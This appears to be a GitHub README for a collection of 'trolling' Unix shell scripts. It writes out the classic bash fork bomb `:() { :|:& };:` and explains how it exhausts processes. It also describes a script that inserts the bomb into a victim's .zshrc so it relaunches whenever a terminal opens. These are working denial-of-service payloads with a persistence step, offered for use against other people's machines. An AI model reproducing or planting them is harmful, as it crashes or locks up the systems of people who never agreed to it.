# troll
This is a collection of unix shell scripts for trolling purposes

### fork_bomb_always
This script will only update the `.zshrc` file to include a simple fork bomb. Updating `.zshrc` means that upon opening a new terminal, the process will start.

This command can be shortened by removing the `cd &&` as this only guarantees that the file will be updated correctly.

### simple_fork_bomb
The code is `:() { :|:& };:`. Basically you are creating a function called `:`, bash functions are in the format of `name () { commands; in; function }`. Inside the fucntion you are calling `:`, piping its output to another instance of `:` and putting this process in the background using `&`. The killer is after defining the function, you finally call it again at the end.
